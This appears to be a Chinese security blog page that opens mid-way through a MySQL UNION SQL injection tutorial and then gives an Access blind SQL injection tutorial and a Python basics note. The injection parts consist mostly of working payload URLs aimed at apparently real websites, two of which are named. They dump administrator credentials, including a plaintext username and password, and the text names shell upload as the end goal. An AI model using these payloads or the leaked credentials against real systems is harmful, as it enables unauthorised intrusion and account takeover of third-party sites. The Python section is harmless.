<p>3,我们再进一步确认注入点,可能表面一眼看去,也许你会认为它是个数字型注入点,其实,它是个字符型的,关于字符型的闭合比较简单,你可以选择把前后的单引号都闭合掉,或者你也可以选择只闭合前面的单引号,然后把后面多余的语句都注释掉也行,随你,只要能保证我们的语句能正常执行即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and '</span>s<span class="string">'='</span>s 	条件为真时,页面返回正常</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm3.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and '</span>s<span class="string">'='</span>sk  条件为假时,页面返回异常</span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_comm4.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=12 --+-  条件为真时,页面返回正常</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_comm5.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 --+- 条件为假时,页面返回异常</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_comm6.png" alt="&#39;&#39;"><br></p>
<p>4,确认为真正的注入点后,我们就可以开始查询各种数据,首先,确定下当前表准确的字段个数,为后面执行union做准备<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' order by 28 --+- 为28返回正常</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm7.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' order by 29 --+- 为29时返回错误,确认当前表的字段个数为28个</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_comm8.png" alt="&#39;&#39;"><br></p>
<p>5,有了确切的字段个数,我们继续执行union爆出对应的数据显示位(爆出对应数据显示位的目的,其实就是要把后续从数据库查出来的各种结果都显示到这些位置上,说的通俗点儿,我们查出来的数据在页面上总得有个地方放吧,要不然我们怎么看呢)<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm9.png" alt="&#39;&#39;"><br></p>
<p>6,搜集当前数据库的各种相关信息,比如,当前数据库用户权限(这里暂时以普通数据库用户权限为例进行演示,关于root权限下的注入方法,后续还会有单独说明),当前数据版本,当前数据库名,目标操作系统类型,目标主机名,数据文件的存放目录,数据库的安装目录等等……实际测试中,不一定非要每次都把信息都查出来,只查对你有用的即可,这里纯粹只是为了大家方便,所以说的相对比较详细<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,user(),6,version(),8,9,10,11,12,13,database(),15,@@version_compile_os,@@hostname,@@datadir,19,20,21,@@basedir,23,24,25,26,27,28 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm10.png" alt="&#39;&#39;"><br></p>
<p>7,对基本情况有所有了解后,接着就可以查出’所有’的数据库名了,当然,这里的’所有’并非真正的’所有’,它指的是当前数据库用户有权限看到的那些数据库,以此注入点为例,目前就只能看到 information_schema,homoeopathy_university 这俩数据库<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,5,6,group_concat(schema_name),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.schemata --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm11.png" alt="&#39;&#39;"><br></p>
<p>8,查出当前库中的所有表名,这里有个坑,不知道是不是group_concat()对查询结果有长度限制的问题,还是目标网站的什么原因,个人感觉应该是有限制(就像oracle中的wm_concat亦是如此),导致group_concat查出来的结果不全,如果表比较少,可能还没什么问题,假如有个一两百张表的情况下,用它就只能看到一部分,所以实际测试中,并不推荐group_concat()[顺便提醒大家一句,不要过于相信网上的一些文章,其实有很多人自己都没深入搞清楚,经常是以讹传讹,一定要多自己尝试,这样出来的东西,才能走心],很显然,这里就出现了这样的问题<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,5,6,group_concat(table_name),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.tables where table_schema=database() --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm12.png" alt="&#39;&#39;"><br></p>
<p>9,所以,下面我就换成limit了,个人觉得用limit还是非常靠谱的,就执行效率来讲,个人觉得相比group_concat()要高一点的,虽然,用limit可能稍微要费点儿劲,不过还好我们有burpsuite帮忙,另外,有时候直接使用database()可能不太好使,可以把它换成上面database()的结果,然后hex一下基本就可以了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.tables where table_schema=database() limit 0,1 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm13.png" alt="&#39;&#39;"><br></p>
<p>10,当burpsuite跑到第142张表时,我们发现,这正是我们想要的网站管理表,表名为 ‘tbl_webmaster’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vuln.com/md_materia_profile_view.php?viewid=2&apos; and 12=124 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.tables where table_schema=database() limit 141,1 --+-</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm14.png" alt="&#39;&#39;"><br></p>
<p>11,既然管理表找到了,接着把该表中的所有字段名查出来就可以了,为了避免单引号的问题,我们还是要把该表名先hex下,另外,这里依然是用limit,查询过程中我们发现第四个字段是username(管理员用户名),第五个字段是password(管理员密码)<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.columns where table_name=0x74626c5f7765626d6173746572 limit 3,1 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm15.png" alt="&#39;&#39;"><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vuln.com/md_materia_profile_view.php?viewid=2&apos; and 12=124 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.columns where table_name=0x74626c5f7765626d6173746572 limit 4,1 --+-</span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_comm16.png" alt="&#39;&#39;"><br></p>
<p>12,现在用户密码字段都有了,直接把用户名和对应的密码hash都查出来即可,如下,防止有多个网站管理员,记得带上limit<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.homoeopathyuniversity.org/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,username,6,password,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from tbl_webmaster limit 0,1 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm17.png" alt="&#39;&#39;"><br></p>
<p>13,最后查出来的账号和密码hash如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">superadmin : e10adc3949ba59abbe56e057f*******</span><br></pre></td></tr></table></figure></p>
<p><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于mysql的常规注入,其实整个流程非常的简单,无非就是’查权限,查路径,查库,查表,查字段,查数据,找到后台登陆传shell’,就其本身来讲并没有多少实质的技术含量在里面,这里纯粹只是为了让大家熟练mysql手工注入,加深对mysql注入的理解,这样万一以后遇到一些比较畸形的注入点,工具罢工,我们手工还依然可以上<br><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/11/access-manual-injection/">
                sql注入入门 之 access常规注入 [ union方式 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-11</span>
            
            
            
                <span class="category">
                    <a href="/categories/all-sql-injection/">all sql injection</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>0x01 用于演示的常规 access 实例注入点,如下,可以看到,正常情况下的页面是这样的:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_1.jpg" alt="&quot;正常情况下的页面&quot;"><br></p>
<p>0x02 尝试 <code>’</code> 干扰后,数据库如期报错,其实在错误里面就已经说的很清楚了,是access的数据库,错误的原因是多了个单引号导致的,既是如此,则证明我们的单引号刚刚已被带入了正常查询,这也正是我们想要看到的效果<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_2.jpg" alt="&quot;数据库报错&quot;"><br></p>
<p>0x03 再次确认是否真的存在注入,我们观察到,条件为真时页面返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_3.jpg" alt="&quot;条件为真返回正常&quot;"><br></p>
<p>0x04 条件为假时页面返回错误,确认无疑,这是个标标准准的access数字型注入点,紧接着我们就可以开始正常查询各种数据了,关于注入access,暂时也看到没什么特别好的办法,表名字段名只能硬猜<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_4.jpg" alt="&quot;条件为假时返回错误&quot;"><br></p>
<p>0x05 首先,尝试猜管理表名,当然,这中间肯定还尝试了很多其它可能的管理表名,比如,admin,login,admin_user等等……直到我们尝试到<code>users</code>表时页面才返回正常,说明该表存在<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> exists(select * from users)</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_5.jpg" alt="&quot;猜管理表名&quot;"><br></p>
<p>0x06 有了管理表名,接着就该猜该表中对应的用户和密码字段名了,当我们尝试 <code>username</code> 字段时,页面返回正常,说明该字段名存在<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> exists(select username from users)</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_6.jpg" alt="&quot;猜账号字段名&quot;"><br></p>
<p>0x07 用户名字段有了,下面该轮到猜密码字段名了,同样,当我们尝试 <code>password</code> 字段名时页面返回正常,说明该字段名也存在<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> exists(select password from users)</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_7.jpg" alt="&quot;猜密码字段名&quot;"><br></p>
<p>0x08 目前为止,表名,字段名都有了,理论上,紧接着直接去爆出相应的数据即可,不过,在爆数据之前,我们还需要先确定当前表的字段个数,后面好执行union,然后爆出数据的显示位,这里就用经典的order by ,很显然,为3的时候,页面返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> order by <span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_8.jpg" alt="&quot;字段为3的时候&quot;"><br></p>
<p>0x09 为4的时候页面返回错误,按说,当前表的字段个数应该为3个才对<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> order by <span class="number">4</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_9.jpg" alt="&quot;字段为4的时候报错&quot;"><br></p>
<p>0x10 但实际测试中,它却显示一直不匹配错误,好吧,想要直截了当的爆出数据估计要费点儿劲了,为了不在这里浪费时间,我们只能暂时用类似盲注的办法来一位位字符的截取数据了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">23</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> from users --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_10.jpg" alt="&quot;猜密码字段名&quot;"><br></p>
<p>0x11 在这之前,我们已经确定了用户及密码的字段名和管理表名,所以,我们就可以像下面这样这样来获取数据<br></p>
<p>0x12 查询 <code>username</code>字段下的第一条数据的长度,当大于7时页面返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> len(username) from users)&gt;<span class="number">7</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_10.png" alt="&quot;字段数据长度&quot;"><br></p>
<p>0x13 大于8时页面返回错误,说明 <code>username</code> 字段下的第一条数据长度为 8 个字符<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> len(username) from users)&gt;<span class="number">8</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_11.png" alt="&quot;username字段第一条数据的长度&quot;"><br></p>
<p>0x14 知道了第一条数据的总长度,我们就要可以开始一个一个字符的截取数据了,下面语句的意思是截取<code>username</code>字段的第一条数据的第一位字符并返回其对应的ascii码,可以看到,为98的时候页面返回正常,而98对应的ASCII码字符是<code>b</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">1</span>,<span class="number">1</span>)) from users)=<span class="number">98</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_12.png" alt="&quot;返回username字段第一条数据的第一个字符的ascii码值&quot;"><br></p>
<p>0x15 截取<code>username</code>字段的第一条数据的第二个字符并返回其对应的ascii码,为119时页面返回正常,而119对应的字符为<code>w</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vlun.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(username,<span class="number">2</span>,<span class="number">1</span>)) from users)=<span class="number">119</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/access_13.png" alt="&quot;第二个字符的ASCII码值&quot;"><br></p>
<p>最后,通过慢慢遍历,<code>username</code> 字段的第一条记录的完整数据为<code>bwrealty</code><br></p>
<p>0x16 <code>username</code>字段查完了,下面又该轮到<code>password</code>字段了,还是一模一样的方法</p>
<p>截取<code>password</code>字段的第一条数据的第一位字符,并返回其对应的ascii码,直到为98时页面猜返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.boardwalk-realty.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(password,<span class="number">1</span>,<span class="number">1</span>)) from users)=<span class="number">98</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/acpass1.png" alt="&quot;第一个字符的ASCII码值&quot;"><br></p>
<p>截取password字段的第一条数据的第二位字符,并返回其对应的ascii码,直到为119时页面猜返回正常<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.boardwalk-realty.com/dauphin</span>-island-vacation-rentals-details.asp?id=<span class="number">240</span> <span class="keyword">and</span> (select top <span class="number">1</span> asc(mid(password,<span class="number">2</span>,<span class="number">1</span>)) from users)=<span class="number">119</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/acpass2.png" alt="&quot;第二个字符的ASCII码值&quot;"><br></p>
<p><code>password</code>字段第一条数据的最终结果为<code>bwrealty123</code>,至此,整个access的常规注入就算基本完成了,大家也都看到了,其实整个注入过程,非常的简单<br><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;针对access的注入,其实真的没什么特别需要注意的,非常简单,因为它没有像mysql,mssql,oracle…那样,直接有提供现成的元数据可以查,表名字段名都只能硬猜,也就是说,如果是字段名猜不着,有后台的情况下,还可以看看后台的登陆表单里的账号密码字段名是什么,然后拿这个来试试,如果压根是表名都猜不着也就猜不着了,没什么曲线可以走,所以,这就需要大家自己平时多去搜集一些命中率相对比较高的管理员表名和账户密码字段名了,另外,因为access数据库,本身就非常小,所以,根本也没有任何权限及用户访问控制机制,自然注入起来也非常的容易,基本上是不用考虑的太多,上手即来<br><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/04/20/python-basic/">
                python 速成笔记 [基础语法 一]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-04-20</span>
            
            
            
                <span class="category">
                    <a href="/categories/python-basic/">python basic</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p>0x01 理解机器码,字节码的基本概念:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">低级语言:  汇编 C </span><br><span class="line">=&gt; 机器码 [直接可以丢给cpu去执行]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">高级语言:  </span><br><span class="line">Java ruby python c# php[应用场景非常局限,只限于web开发] C++ ...</span><br><span class="line">=&gt; 字节码 [通常是个二进制文件(python中是.pyc文件),也叫中间代码,还需要对应的各类语言的解释器进一步转换成机器码才能直接被cpu执行]</span><br></pre></td></tr></table></figure>
<p>0x02 了解 python 的一些常见种类:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C    python	c语言版 python	默认大家所说的python一般都是指C python</span><br><span class="line">J    python	java版  python</span><br><span class="line">iron python	C#版 	python</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>0x03 不同python版本号间的一些区别:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python 2.6  属于过度版本</span><br><span class="line">python 2.7  也属于过度版本,2020年后将不再被支持</span><br><span class="line">python 3.5  属于重大改进后的版本</span><br></pre></td></tr></table></figure></p>
<p>0x04 不同版本间的语法区别样例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">部分函数名称变更,底层执行效率提升,如下,简单的事例</span><br><span class="line">print &quot;hello python2.7&quot;  2.x 的输出写法</span><br><span class="line">print(&quot;hello python3.x&quot;) 3.x 的输出写法</span><br></pre></td></tr></table></figure></p>
<p>0x05 python 解释器自身的工作细节:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取并执行文件中的python代码 -&gt; 转换成对应的字节码 -&gt; 再转换成机器码 -&gt; 到cpu上执行</span><br></pre></td></tr></table></figure></p>
<p>0x06 执行python代码的两种方式:</p>
<p>直接通过代码文件执行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python 源代码文件通常以.py结尾的,但这并不是必须的</span><br><span class="line">指定python解释器位置,指定要执行的python代码文件位置 如,c:\python36\python.exe d:\demo.py 语法没有错误的前提下,即可被成功执行</span><br></pre></td></tr></table></figure></p>
<p>进入python解释器下执行python代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Python36&gt;python.exe</span><br><span class="line">Python 3.6.0 (v3.6.0:41df79263a11, Dec 23 2016, 08:06:12) [MSC v.1900 64 bit (AMD64)] on win32</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; print(&quot;hello python3.6&quot;)</span><br><span class="line">&gt;&gt;&gt; exit()</span><br></pre></td></tr></table></figure></p>
<p>0x07 最基础的计算机编码常识:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii码,这也是最开始的字符表示方式</span><br><span class="line">只需占1个字节,即8位,2的8次方等于256,完全可以把键盘上所有的英文字母和数字,特殊字符都表示完</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">汉语字符集的大致发展历程</span><br><span class="line">GB2312 -&gt; GBK -&gt; GB18030 -&gt; unicode</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">了解 unicode 编码 [ 万国码 ]</span><br><span class="line">统一占两个字节,一上来就占16位</span><br><span class="line">另外,我们知道在unicode编码中一个汉字要占三个字节,也就是说还多出一个字节的空间被浪费了</span><br><span class="line">同样,像字母这种不足16位的,也是按16位的大小来存,缺点已经显而易见了,浪费空间,所以后来就优化出了utf-8编码</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">utf-8编码</span><br><span class="line">属基于unicode优化后的编码,对于英文,字母和特殊字符,全部用8位表示,中文则用24位</span><br><span class="line">针对不同的字符给不同的大小,实现自动变长,合理利用资源,基本支持全球大部分国家的语言</span><br></pre></td></tr></table></figure>
<p>0x08 不同的python版本对编码的处理:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python 2.x 默认使用ascii编码,如果有中文,则需要事先手工指定编码</span><br><span class="line">python 3.x 默认unicode编码,所以基本无需太关注编码问题</span><br></pre></td></tr></table></figure></p>
<p>比如,在 python 2.x 代码中使用中文就必须事先代码文件头部,指定好字符集,如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br></pre></td></tr></table></figure></p>
<p>在python2.7中手工处理win cmd输出中文乱码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">utf-8 到 gbk  unicode[万国码]相当于中间人 </span><br><span class="line">先把utf-8解码成unicode,再把unicode编码成gbk,下面就是具体的代码编码和解码流程</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7</span><br><span class="line"># --*-- coding:utf-8 --*--</span><br><span class="line"></span><br><span class="line">stri = &apos;python 的创始人是吉多·范罗苏姆&apos;</span><br><span class="line">dec_stri = stri.decode(&apos;utf-8&apos;)</span><br><span class="line">in_stri = dec_stri.encode(&apos;gbk&apos;)</span><br><span class="line">print in_stri</span><br></pre></td></tr></table></figure>
<p>如果是在python 3.x中,win cmd是不用手工编码再解码的,在python 3.x内部就已经帮我们把编码处理好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3.5</span><br><span class="line">stri = &apos;python的创始人为吉多·范罗苏姆&apos;                                                                            </span><br><span class="line">print(stri)</span><br></pre></td></tr></table></figure></p>
